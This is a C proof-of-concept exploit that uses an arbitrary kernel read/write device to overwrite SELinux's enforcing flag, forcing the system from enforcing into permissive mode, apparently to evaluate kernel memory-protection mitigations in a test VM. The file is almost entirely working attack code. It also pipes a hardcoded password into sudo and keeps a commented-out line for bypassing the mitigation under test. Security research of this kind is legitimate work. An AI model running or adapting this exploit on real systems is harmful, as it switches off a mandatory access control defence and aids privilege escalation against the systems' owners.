// FZY: Add a simple selinux bypass proof of concept that overwrites selinux_state.enforcing from 1 (enforcing mode) to 0 (permissive mode)

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define ENFORCING_SIZE 1

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

static unsigned char orig_state_enforce;

// What SELinux itself reports, as opposed to the byte we read with arb_read.
int read_enforce(void) {
  int value = -1;
  FILE *fp = fopen("/sys/fs/selinux/enforce", "r");

  if (!fp)
    return -1;
  if (fscanf(fp, "%d", &value) != 1)
    value = -1;
  fclose(fp);
  return value;
}

// selinux_state.enforcing is only ever 1 when SELinux is the active LSM, so
// say that plainly instead of failing later on sestatus output that never comes.
void require_selinux(void) {
  if (read_enforce() < 0) {
    printf("[-] SELinux is not active. Boot with "
           "run_oriqemu_cuslinux.sh --selinux\n");
    exit(1);
  }

  // An unlabelled filesystem makes enforcing mode deny everything, sshd
  // included, so refuse to raise it rather than locking the machine out.
  fflush(stdout);
  if (access("/.autorelabel", F_OK) == 0 ||
      system("ls -Zd /bin/bash | grep -q unlabeled_t") == 0) {
    printf("[-] filesystem is not labelled; relabel once first:\n"
           "    sudo fixfiles -F relabel && sudo rm -f /.autorelabel\n");
    exit(1);
  }
}

// The VM boots permissive, so put SELinux into enforcing the legitimate way
// first - the same shape as kptr_restrict_poc and sysctl_io_uring_disabled_poc.
// orig_state_enforce is read before this, so the restore undoes it too.
void raise_enforcing(void) {
  if (read_enforce() == 1)
    return;

  printf("[+] Raising SELinux to enforcing with setenforce\n");
  fflush(stdout);
  system("sh -c 'echo debian | sudo -S setenforce 1 2>/dev/null'");
  if (read_enforce() != 1) {
    printf("[-] Could not get SELinux into enforcing mode\n");
    exit(1);
  }
}

void verify_state_enforce_addr(int fd, unsigned long state_enforce_addr) {
  printf("[+] state_enforce address: 0x%lx\n", state_enforce_addr);

  // Read the original before setenforce, so the restore puts the mode back to
  // whatever the machine was in when the PoC started.
  arb_read(fd, state_enforce_addr, &orig_state_enforce, ENFORCING_SIZE);
  printf("[+] state_enforce value at start: %u\n", orig_state_enforce);

  if (orig_state_enforce > 1) {
    printf("[-] Invalid state_enforce value read from kernel: %u\n",
           orig_state_enforce);
    exit(1);
  }

  raise_enforcing();

  unsigned char current_value;
  arb_read(fd, state_enforce_addr, &current_value, ENFORCING_SIZE);
  printf("[+] Current state_enforce value: %u\n", current_value);
  if (current_value != 1) {
    printf("[-] SELinux is enforcing, but state_enforce reads %u - wrong "
           "address?\n", current_value);
    exit(1);
  }
}

void restore_state_enforce(int fd, unsigned long state_enforce_addr) {
  unsigned char readback;

  arb_write(fd, state_enforce_addr, &orig_state_enforce, ENFORCING_SIZE);
  arb_read(fd, state_enforce_addr, &readback, ENFORCING_SIZE);
  if (readback != orig_state_enforce) {
    printf("[-] state_enforce restore failed, now: %u\n", readback);
    return;
  }
  printf("[+] state_enforce restored to %u\n", orig_state_enforce);
  if (read_enforce() != orig_state_enforce)
    printf("[-] but /sys/fs/selinux/enforce reads %d\n", read_enforce());
}

void overwrite_state_enforce(int fd, unsigned long state_enforce_addr) {
  printf("[+] Overwriting state_enforce at 0x%lx\n", state_enforce_addr);

  char *new_value = "\x00";
  arb_write(fd, state_enforce_addr, new_value, 1);

  printf("[+] state_enforce overwritten!\n");
}

// Run sestatus before the overwrite, so the mode change reads as a before/after
// pair.
void snapshot_sestatus(void) {
  printf("[+] SELinux mode before overwrite:\n");
  // sestatus writes straight to fd 1, so flush our block-buffered stdout first
  // or its line lands above this label when stdout is a pipe.
  fflush(stdout);
  if (system("sestatus | grep -i 'current mode'") != 0)
    printf("[-] Failed to run sestatus\n");
}

void verify_exploit() {
  printf("[+] Checking if exploit worked...\n");

  // Execute sestatus
  int ret = system("sestatus | grep 'Current mode: .*permissive' > /dev/null");
  if (ret == 0) {
    printf("[+] Exploit succeeded! SELinux is in permissive mode now.\n");
  } else {
    printf("[-] Exploit failed! SELinux is still in enforcing mode.\n");
  }
}

int main(int argc, char *argv[]) {
  printf("[+] Privilege escalation PoC by overwriting state_enforce\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <state_enforce_addr>\n", argv[0]);
    printf("\t- mode: 0 for no protection, 1 for Sensitivity Tag, "
           "2 for Sensitivity and TypeID Tag.\n");
    printf("\t- state_enforce_addr: nm vmlinux | grep state_enforce\n");
    return 1;
  }

  require_selinux();

  printf("[+] Opening /dev/arb_rw...\n");

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open");
    exit(1);
  }

  printf("[+] Device opened successfully\n");
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("Invalid mode. Use 0 for no protection, "
      "1 for protection with Sensitivity Tag, "
      "and 2 for protection with Sensitivity and TypeID Tag.\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long state_enforce_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    // Get the address of state_enforce from the kernel with arb_read, because we store the address of state_enforce in the global variable and store the string content at unpredictable address
    arb_read(arbrw_dev_fd, state_enforce_addr, &state_enforce_addr, sizeof(unsigned long));

    printf("[+] state_enforce address from kernel memory: 0x%lx\n", state_enforce_addr);

    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // state_enforce_addr = state_enforce_addr | 0xFFFF000000000000;
  }
  
  verify_state_enforce_addr(arbrw_dev_fd, state_enforce_addr);

  snapshot_sestatus();

  overwrite_state_enforce(arbrw_dev_fd, state_enforce_addr);

  verify_exploit();

  restore_state_enforce(arbrw_dev_fd, state_enforce_addr);

  close(arbrw_dev_fd);
  return 0;
}